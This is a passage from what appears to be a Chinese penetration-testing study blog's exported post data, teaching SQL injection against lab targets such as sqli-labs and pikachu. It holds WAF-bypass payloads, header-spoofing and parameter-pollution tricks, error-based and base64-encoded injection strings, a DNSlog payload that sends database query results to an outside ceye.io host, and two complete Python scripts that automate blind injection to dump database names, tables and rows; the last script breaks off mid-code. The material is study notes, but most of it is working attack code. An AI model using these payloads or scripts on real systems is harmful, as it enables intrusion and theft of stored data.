/!UnIon12345SelEcT/1,user()//数字范围1000-50540 （5）mysql黑魔法 select{xusername}from{x11test.admin}; SQLServer技巧 （1）用来注释掉注入后查询的其余部分： 1/* C语言风格注释 SQL注释 1;00％空字节 （2）空白符：[0x01-0x20] （3）特殊符号：%3a冒号 1id=1union:select1,2from:admin （4）函数变形：如db_name 空白字符 3、Oracle技巧 注释符：–、/**/ 空白字符：[0x00,0x09，0x0a-0x0d,0x20] 4.配合FUZZ（SQLI FUZZ字典，SQL注入过滤关键字的Fuzz字典） 就是模糊测试，批量测试 1select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,db_name()【位置四】from【位置五】admin WAF绕过-逻辑层逻辑问题 云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护。 当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。 HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。 （4）特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id=1 %00 and 1=2 union select 1,2,column_name from information_schema.columns 性能问题 猜想1：在设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。 猜想2：不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。 例子1： 123?id=1and(select1)=(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9PS：0xA*1000指0xA后面”A&quot;重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考也许在有些情况下可能不需要这么长也能溢出。 例子2： 12345678910111213?a0=0&amp;a1=1&amp;.....&amp;a100=100&amp;id=1unionselect1,schema_name,3fromINFORMATION_SCHEMA.schemata备注：获取请求参数，只获取前100个参数，第101个参数并没有获取到，导致SQL注入绕过。 白名单 方式一：IP白名单 从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。 测试方法： 1234567修改http的header来bypasswafX-forwarded-forX-remote-IPX-originating-IPx-remote-addrX-Real-ip 方式二：静态资源 特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。 123http://10.9.9.201/sql.php?id=1http://10.9.9.201/sql.php/1.js?id=1 备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别 方式三：url白名单 为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势 WAF及绕过思路安全狗安装1https://www.vulner.me/docs/install-safedog/ SQL绕过基础知识 部分bypass sqlinject payload 123id=1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23 id=-1 union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23 123id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23 id=-1%20union%20/*!44509select*/%201,2,3%23 /*!44509select*/当数据库版本是4.45.09以上版本就会执行/*! .... */ 中的语句，否则不会执行，而如果没有44509`/*!select*/`就只能是注释。 1234567id=1/**&amp;id=-1%20union%20select%201,2,3%23*/ %20是空格，%23是#这条语句就是:id=1/**&amp;id=-1 union select 1,2,3#*/ /***/代表注释的意思,而在apache中如果一个变量接收2个参数,最后的那个参数就是最后的结果，就相当于id=1/**和id=-1%20union%20select%201,2,3%23*/ 接收了后者M这里利用了参数污染。等价sql语句:select * from users where id=-1 union select 1,2,3#*/ 12345678910id=-1 %20union%20all%23%0a%20select%201,2,3%23 id=-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23 /**/注释符不影响%230%0A ==#0换行相当于:id=-1 union all# select 1,#0 database/**/(),3# 最后执行结果就是id=-1 union all select 1,database/**/(),3# 加不加all都一样 注入提交方式绕过WAF 如果我们的参数是通过REQUEST进行接收的，而WAF通过检测GET的方式进行防护，我们就可以通过POST的方式提交数据，从而绕过WAF 我们测试发现成功绕过 通过注释符绕过 1/**/和/***/都是注释符，都可以用来注释。他们的效果是一样的。 通过加入注释符，不影响sql语句，达到绕过的目的。 http参数污染 在与服务器进行交互的过程中，客户端往往会在GET/POST请求中带上参数。通常在一个请求中，同名参数只会出现一次，但是在HTTP协议中是允许同名参数多次出现的。 以上图服务器为例假设请求为index.php?id=1&amp;id=2，客户端请求首先通过tomcat解析第一个参数，接下来tomcat去请求apache服务器，而apache解析最后一个参数。实际提供服务的是apache服务器，因此返回客户端的是id=2。 Web服务器 参数获取函数 获取到的参数 PHP/Apache $_GET(“par”) Last JSP/Tomcat Request.getParameter(“par”) First Perl(CGI)/Apache Param(“par”) First Python/Apache Getvalue(“par”) All(List) ASP/IIS Request.QueryString(“par”) All(comma-delimited string) 可以看到apache最后接收到了3。 涉及资源：123https://www.cnblogs.com/backlion/p/9721687.htmlhttps://blog.csdn.net/nzjdsds/article/details/93740686","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"17WEB漏洞--SQL注入之二次、加解密、DNS等注入","slug":"17WEB漏洞-SQL注入之二次、加解密、DNS等注入","date":"2021-09-21T02:29:49.000Z","updated":"2021-09-21T06:05:14.335Z","comments":true,"path":"2021/09/21/17WEB漏洞-SQL注入之二次、加解密、DNS等注入/","link":"","permalink":"https://al0nez.github.io/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 加解密原理将参数通过base64或者其他方式进行加密，然后进行传输，在通过后端进行解密。 例子1http://127.0.0.1/sqli/Less-21/ 1Cookie: uname=YWRtaW4%3D; cookie存在加密YWRtaW4%3D，base64转换为admin，所有我们只需要将我们的注入通过base64加密传输过去就ok了。 第一个返回正确，第二个返回错误存在注入。 123admin&#x27;) and 1=1 #编码后:YWRtaW4nKSBhbmQgMT0xICM= 123admin&#x27;) and 1=2 #编码后:YWRtaW4nKSBhbmQgMT0yICM= 这里试下报错注入 12&#x27;) and extractvalue(1,concat(0x7e,database(),0x7e)) #JykgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSkpICM= 通过sqlmap中转注入，将payload编码为base64 12345678&lt;?php$url=&#x27;http://xxxx/job_bystjb/yjs_byszjs.asp?id=&#x27;;$payload=base64_encode($_GET[&#x27;x&#x27;]);echo $payload;$urls=$url.$payload;file_get_contents($urls);echo $urls;?&gt; 二次注入原理 ​ 二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。详细点来讲，就是在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。二次注入无法通过扫描工具或者代码自己手工测试出来的，二次注入一般会产生在网站程序源代码才会发现的注入漏洞，从前端或者黑盒测试是看不到这个漏洞的。 产生二次注入一般产生在有登录注册页面这里 限制有时候网页会通过限制输入长度来限制我们，如果是前端限制的话，我们可以将限制修改掉，如果是后端，那没办法了。 例子1http://127.0.0.1/sqli/Less-24/ 我们首先创建一个admin’#的用户 然后我们登录 将密码修改为admin此时数据库中admin的密码为1234 可以看到admin的密码被我们修改为admin，这样就形成了二次注入，我们试试报错注入 1&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) # 没成功，数据库限制了长度，试试密码能注入不，也不能。 原理就是这样。 DNSlog注入原理首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了。DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息 UNCUNC（Universal Naming Convention）：通用命名规则，也称通用命名规范、通用命名约定。UNC为网络（主要指局域网）上资源的完整Windows名称。UNC路径格式：\\servername\\sharename，其中servername是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory\\filename。由于反斜杠的转义效果，语句中输入的四个反斜杠 （\\\\），在转义后得到（\\）。实际执行的只有两个反引号。 流程concat函数将执行结果与获取到的域名（XXX.ceye.io\\abc）拼接，构成一个新的域名， load_file()可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析，然后我们查看DNS解析记录就可以得到sql查询结果 注意1234windows： load_file()查看mysql读取权限。show variables like &#x27;%secure%&#x27;;secure_file_priv项为空才可以使用load_fil()函数，在mysql.ini中添加 secure_file_priv=&#x27;&#x27; 利用场景在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNSlog注入。 推荐平台123http://ceye.io/（需要注册） http://www.dnslog.cnhttp://admin.dnslog.link 例子1http://127.0.0.1/sqli/Less-9/ 1http://127.0.0.1/sqli/Less-9/?id=-1&#x27; and if((select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.nd91wz.ceye.io\\\\abc&#x27;))),1,0)--+ &quot;\\\\\\\\&quot; 四个\\不能少 注意.xxxx.ceye.io是你的子域名，前面要加个. 后面的\\\\xxx，\\\\是必须的，`xxx这部分随便是什么内容，不能为空。 工具也可以使用工具 1https://github.com/adooo/dnslogsqlinj","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"16WEB漏洞--SQL注入之查询方式及报错盲注","slug":"16WEB漏洞-SQL注入之查询方式及报错盲注","date":"2021-09-21T02:29:31.000Z","updated":"2021-09-21T06:05:19.803Z","comments":true,"path":"2021/09/21/16WEB漏洞-SQL注入之查询方式及报错盲注/","link":"","permalink":"https://al0nez.github.io/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 前言当进行 SQL 注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是 SQL 语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL 语句大概写法也能更好的选择对应的注入语句。 数据库操作查在网站应用中进行数据显示查询效果 1select 列名称 或 * from 表名称 where 字段1=&#x27;条件1&#x27; and 字段2=&#x27;条件2&#x27; 增在网站应用中进行用户注册添加等操作 1insert into table name(列1,列2 ...) values(值1,值2) 改会员或后台中心数据同步或缓存等操作 1update 表名称 set 列名称=新值 where 列名称=某值 删后台管理里面删除文章删除用户等操作 1delete from 表名称 where 列名称=值 order by 排序数据一般结合表名或列名进行数据排序操作 1select 列名称 或 * from 表名称 order by 列名 重点理解：我们可以通过以上查询方式与网站应用的关系 注入点产生地方或应用猜测到对方的 SQL 查询方式 SQL 注入报错盲注盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类： 基于布尔的 SQL 盲注-逻辑判断 1regexp,like,ascii,left,ord,mid 基于时间的 SQL 盲注-延时判断 1if,sleep 基于报错的 SQL 盲注-报错回显 1floor，updatexml，extractvalue 基于报错的 SQL 盲注-报错回显1常用报错注入函数:floor，updatexml，extractvalue floor报错注入（64显示位限制）原理 12https://blog.csdn.net/zpy1998zpy/article/details/80650540https://www.freebuf.com/column/235496.html payload 小迪讲的那个有点麻烦，我简化了一下 查数据库 1username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit 查表名 1username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit 查列名 1username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,column_name,0x7e) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit 查数据 1username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,concat(username,0x7e,password),0x7e) from pikachu.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit updatexml报错注入（32显示位限制）原理 1https://blog.csdn.net/weixin_33881140/article/details/89565706 payload 查数据库 1username=3&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit 查表名 1username=3&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 3,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit 查列名 1username=3&#x27;and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit 查数据 1username=3&#x27;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from pikachu.users limit 0,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit extractvalue报错注入（32显示位限制）原理 1https://blog.csdn.net/weixin_33881140/article/details/89565706 payload 查数据库 1username=1 &#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit 后面的和updatexml差不多，需要注意的是extractvalue只有俩个参数 update注入刚才上面是通过insert进行的注入，这里试一下update，原理一样这里就查一下数据库名，其他的看上面。 floor1sex=a&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit updatexml1sex=a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit extractvalue1sex=a&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit delete注入GET方式的话，如果是在burp suite中去进行注入，需要将空格改为加号或者%20。POST则不需要 floor1http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) updatexml1http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and updatexml(1,concat(0x7e,database(),0x7e),1) extractvalue1http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and extractvalue(1,concat(0x7e,database(),0x7e)) 基于时间的 SQL 盲注-延时判断基础知识1234567891011like &#x27;ro%&#x27; #判断ro或ro...是否成立regexp &#x27;^xiaodi[1-z]&#x27; #匹配xiaodi及xiaodi...等if(条件,5,0) #条件成立，返回5，反之，返回0sleep(5) #SQL语句延时执行5秒mid(a,b,c) #从位置b开始，截取a字符串的c位substr(a,b,c) #从B位置开始，截取字符串a的c长度left(database(),1),database() #left(a,b)从左侧截取a的前b位length(database())=8 #判断数据库database()名的长度ascii() 字符串转换ascii码ord ascii码转换为数字ord=ascii ascii(x)=97 #判断x的ascii码是否等于97 页面错误和正确返回一样。一般都用脚本跑 查看数据库1payload：if(ascii(substr(database(),1,1))=114,sleep(5),1) 查看表名 1and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)--+ 脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253&#x27;&#x27;&#x27;author : L0ne1ytime : 2021-08-29&#x27;&#x27;&#x27;import requestsimport timedef close(url): s = input(&quot;请输入闭合方式:&quot;) url = url + s return urldef db_ascii_list(): ascii_list = [] for i in range(33, 127): ascii_list.append(chr(i)) return ascii_list# 爆破数据库名def db_name(url, str, ascii_list): print(&quot;[-]开始爆破数据库名.......&quot;) num = 1 while True: db_payload = url + &quot; and if(length(database())=%d,sleep(2),1) --+&quot; % num start_time = time.time() # print(db_payload) r = requests.get(db_payload) if time.time() - start_time &gt; 2: db_length = num break else: num += 1 # print(db_length) db_name = &#x27;&#x27; for i in range(1, db_length + 1): max = 127 min = 33 while abs(max - min) &gt; 1: midx = int((max + min) / 2) db_name_payload = url + &quot; and if(ord(mid((database()),%d,1))&gt;%d,sleep(2),1) --+&quot; % (i, midx) # print(db_name_payload) start_time = time.time() r = requests.get(db_name_payload) if time.time() - start_time &gt; 2: min = midx else: max = midx db_name += chr(max) print(&quot;[+]数据库名：%s\\n&quot; % db_name) return db_name# 爆破表名def tb_name(url, str, ascii_list, db_name): print(&quot;[-]开始爆破表名&quot;) i = 1 while True: tb_payload = url + &quot; and if((select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % ( db_name, i) # print(tb_payload) start_time = time.time() r = requests.get(tb_payload) if time.time() - start_time &gt; 2: tb_number = i break else: i += 1 j = 1 tb_name_length = [] for i in range(tb_number): while True: tb_name_length_payload = url + &quot; and if((select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % ( db_name, i, j) # print(tb_name_length_payload) start_time = time.time() r = requests.get(tb_name_length_payload) if time.time() - start_time &gt; 2: tb_name_length.append(j) j = 1 break else: j += 1 tb_name_list = [] for i in range(tb_number): tb_name = &#x27;&#x27; for j in range(1, tb_name_length[i] + 1): max = 127 min = 33 while abs((max - min)) &gt; 1: midx = int((max + min) / 2) tb_name_payload = url + &quot; and if(ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % ( db_name, i, j, midx) start_time = time.time() r = requests.get(tb_name_payload) # print(tb_name_payload) if time.time() - start_time &gt; 2: min = midx else: max = midx tb_name += chr(max) tb_name_list.append(tb_name) print(&quot;\\n[+]%s库下的%d张表为：%s\\n&quot; % (db_name, tb_number, tb_name_list)) return tb_name_listdef column_name(url, str, ascii_list, tb_name_list, db_name): while True: tb_name = input(&quot;请输入你选择的表名(例如 admin):&quot;) if tb_name in tb_name_list: break else: print(&quot;输入的表名有误,请重新输入&quot;) j = 1 while True: column_num_payload = url + &quot; and if((select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d,sleep(2),1) --+&quot; % ( tb_name, db_name, j) # print(column_num_payload) start_time = time.time() r = requests.get(column_num_payload) if time.time() - start_time &gt; 2: column_num = j break else: j += 1 column_name_length = [] k = 1 for j in range(column_num): while True: column_name_length_payload = url + &quot; and if((select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1)=%d,sleep(2),1) --+&quot; % ( tb_name, db_name, j, k) # print(column_name_length_payload) start_time = time.time() r = requests.get(column_name_length_payload) if time.time() - start_time &gt; 2: column_name_length.append(k) k = 1 break else: k += 1 print(&quot;[-]开始爆破%s表的字段名:&quot; % tb_name) column_name_list = [] for i in range(len(column_name_length)): column_name = &#x27;&#x27; for j in range(1, column_name_length[i] + 1): max = 127 min = 33 while abs(max - min) &gt; 1: midx = int((max + min) / 2) column_name_payload = url + &quot; and if(ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27; limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % ( tb_name, db_name, i, j, midx) # print(column_name_payload) start_time = time.time() r = requests.get(column_name_payload) if time.time() - start_time &gt; 2: min = midx else: max = midx column_name += chr(max) column_name_list.append(column_name) print(&quot;[+]%s表的字段名分别为:%s&quot; % (tb_name, column_name_list)) return column_name_list, tb_namedef dump_data(url, str, tb_name, db_name, column_name_list): i = 1 while True: data_num_payload = url + &quot; and if((select count(*) from %s.%s)=%d,sleep(2),1) --+&quot; % ( db_name, tb_name, i) # print(data_num_payload) start_time = time.time() r = requests.get(data_num_payload) if time.time() - start_time &gt; 2: data_num = i break else: i += 1 print(&quot;[-]开始爆破%s数据库的%s表中数据:&quot; % (db_name, tb_name)) k = 1 data_length = [] dump_data_list = [] dump_data = &#x27;&#x27; for i in column_name_list: for j in range(data_num): while True: dump_data_length_payload = url + &quot; and if(ascii(substr((select %s from %s.%s limit %d,1),%d,1)),sleep(2),1) --+&quot; % ( i, db_name, tb_name, j, k) # print(dump_data_length_payload) start_time = time.time() r = requests.get(dump_data_length_payload) if time.time() - start_time &lt; 2: dump_data_length = k - 1 k = 1 break else: k += 1 data_length.append(dump_data_length) for l in range(1, dump_data_length + 1): max = 127 min = 33 while abs(max - min) &gt; 1: midx = int((max + min) / 2) dump_data_payload = url + &quot; and if(ord(mid((select %s from %s.%s limit %d,1),%d,1))&gt;%d,sleep(2),1) --+&quot; % ( i, db_name, tb_name, j, l, midx) # print(dump_data_payload) start_time = time.time() r = requests.get(dump_data_payload) if time.time() - start_time &gt; 2: min = midx else: max = midx dump_data += chr(max) # print(dump_data) dump_data_list.append(dump_data) dump_data = &#x27;&#x27; # print( dump_data_list) print(&quot;[+]%s数据库的%s表的数据:&quot; % (db_name, tb_name)) j = 0 num_1 = len(dump_data_list) // data_num for i in range(data_num): j = i for k in range(num_1): print(&quot;%s\\t\\t&quot; % dump_data_list[j], end=&#x27;&#x27;) j = i + data_num print()def re(url, str, ascii_list, tb_name_list, db_name): while True: tb_name = input(&quot;如需跑其他表,请输入任意字符,否则输入No(例如 admin):&quot;) if tb_name == &#x27;NO&#x27; or tb_name == &#x27;No&#x27; or tb_name == &#x27;no&#x27;: break else: print(tb_name_list) column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name) dump_data(url, str, tb_name, db_name, column_name_list)url = input(&quot;请输入URL:&quot;) # 目标url http://127.0.0.1/sqli/Less-5/?id=1url = close(url)ascii_list = db_ascii_list()db_name = db_name(url, str, ascii_list)tb_name_list = tb_name(url, str, ascii_list, db_name)column_name_list, tb_name = column_name(url, str, ascii_list, tb_name_list, db_name)dump_data(url, str, tb_name, db_name, column_name_list)re(url, str, ascii_list, tb_name_list, db_name) 基于布尔的SQL盲注-逻辑判断一般都用脚本跑 页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据。也可以用时间盲注 查数据库名长度，需要一个一个试 1http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())=8 --+ 脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224import requestsdef close(url): s = input(&quot;请输入闭合方式:&quot;) url = url + s return urldef db_ascii_list(): ascii_list = [] for i in range(33, 127): ascii_list.append(chr(i)) return ascii_list# 爆破数据库名def db_name(url, str, ascii_list): print(&quot;[-]开始爆破数据库名.......&quot;) num = 1 while True: db_payload = url + &quot; and length(database())=%d --+&quot; % num r = requests.get(db_payload) if str in r.text: db_length = num break else: num += 1 db_name = &#x27;&#x27; for i in range(1, db_length + 1): for j in ascii_list: db_name_payload = url + &quot; and ord(mid((database()),%d,1))=%d --+&quot; % (i, ord(j)) # print(db_name_payload) r = requests.get(db_name_payload) if str in r.text: db_name += j break else: pass print(&quot;[+]数据库名：%s\\n&quot; % db_name) return db_name# 爆破表名def tb_name(url, str, ascii_list, db_name): print(&quot;[-]开始爆破表名&quot;) i = 1 while True: tb_payload = url + &quot; and (select count(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27;)=%d --+&quot; % ( db_name, i) # print(tb_payload) r = requests.get(tb_payload) if str in r.text: tb_number = i break else: i += 1 j = 1 tb_name_length = [] for i in range(tb_number): while True: tb_name_length_payload = url + &quot; and (select length(table_name) from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % ( db_name, i, j) # print(tb_name_length_payload) r = requests.get(tb_name_length_payload) if str in r.text: tb_name_length.append(j) j = 1 break else: j += 1 tb_name_list = [] for i in range(tb_number): tb_name = &#x27;&#x27; for j in range(1, tb_name_length[i] + 1): for k in ascii_list: tb_name_payload = url + &quot; and ord(mid((select table_name from information_schema.tables where table_schema=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % ( db_name, i, j, ord(k)) r = requests.get(tb_name_payload) # print(tb_name_payload) if str in r.text: tb_name += k break else: pass tb_name_list.append(tb_name) print(&quot;\\n[+]%s库下的%d张表为：%s\\n&quot; % (db_name, tb_number, tb_name_list)) return tb_name_listdef column_name(url, str, ascii_list, tb_name_list, db_name): while True: tb_name = input(&quot;请输入你选择的表名(例如 admin):&quot;) if tb_name in tb_name_list: break else: print(&quot;输入的表名有误,请重新输入&quot;) j = 1 while True: column_num_payload = url + &quot; and (select count(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; and table_schema=&#x27;%s&#x27;)=%d --+&quot; % ( tb_name, db_name, j) # print(column_num_payload) r = requests.get(column_num_payload) if str in r.text: column_num = j break else: j += 1 column_name_length = [] k = 1 for i in range(column_num): while True: column_name_length_payload = url + &quot; and (select length(column_name) from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1)=%d --+&quot; % ( tb_name, i, k) # print(column_name_length_payload) r = requests.get(column_name_length_payload) if str in r.text: column_name_length.append(k) k = 1 break else: k += 1 print(&quot;[-]开始爆破%s表的字段名:&quot; % tb_name) column_name_list = [] for i in range(len(column_name_length)): column_name = &#x27;&#x27; for j in range(1, column_name_length[i] + 1): for k in ascii_list: column_name_payload = url + &quot; and ord(mid((select column_name from information_schema.columns where table_name=&#x27;%s&#x27; limit %d,1),%d,1))=%d --+&quot; % ( tb_name, i, j, ord(k)) # print(column_name_payload) r = requests.get(column_name_payload) if str in r.text: column_name += k break else: pass column_name_list.append(column_name) print(&quot;[+]%s表的字段名分别为:%s&quot; % (tb_name, column_name_list)) return column_name_list, tb_namedef dump_data(url, str, tb_name, db_name, column_name_list): i = 1 while True: data_num_payload = url + &quot; and (select count(*) from %s.%s)=%d --+&quot; % (db_name, tb_name, i) # print(data_num_payload) r = requests.get(data_num_payload) if str in r.text: data_num = i break else: i += 1 print(&quot;[-]开始爆破%s数据库的%s表中数据:&quot; % (db_name, tb_name)) k = 1 data_length = [] dump_data_list = [] dump_data = &#x27;&#x27; for i in column_name_list: for j in range(data_num): while True: dump_data_length_payload = url + &quot; and ascii(substr((select %s from %s.%s limit %d,1),%d,1)) --+&quot; % ( i, db_name, tb_name, j, k) # print(dump_data_length_payload) r = requests.get(dump_data_length_payload) if str not in r.text: dump_data_length = k - 1 k = 1 break else: k += 1 data_length.append(dump_data_length) for l in range(1, dump_data_length + 1): max = 127 min = 33 while abs(max - min) &gt; 